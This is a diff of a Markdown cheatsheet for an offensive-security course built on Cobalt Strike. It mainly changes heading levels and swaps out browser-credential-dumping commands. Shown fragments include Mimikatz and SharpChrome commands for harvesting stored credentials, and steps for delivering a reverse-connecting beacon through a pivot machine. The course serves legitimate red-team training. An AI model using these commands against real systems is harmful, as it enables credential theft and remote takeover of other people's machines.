@@ -16,9 +16,9 @@ The exam itself was very challenging at least for me — I failed my first two a
 This Cheatsheet is simply a quick reference for the commands and techniques covered throughout the course. All the information shared here is directly related to the course material and is not my own original content.
 > 
 
-# **CobaltStrike**
+## **CobaltStrike**
 
-## **beacon Commands**
+### **beacon Commands**
 
 ```bash
 # Misc
@@ -596,9 +596,7 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 sekurlsa::credman
 
 # Web Browsers
-Import-Module C:\Tools\Get-WebCredentials.ps1
-Get-WebCredentials
-beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome
+execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
 ```
 
 ### **DPAPI**
@@ -741,6 +739,7 @@ rportfwd 28190 localhost 80
 rportfwd 4444 windows/beacon_reverse_tcp
 ## 3. Host the beacon payload via the *Scripted Web Delivery* method *on the* Team Server*.* and Make sure to select the pivot listener when generating the payload, so the target retrieves and executes a beacon that calls back through the Foothold Machine.
 ```
+Sample graph demonstrating the use of a pivot listener to obtain a Beacon shell on an unreachable machine
 
 ![image.png](/assets/crto/image.png)
 
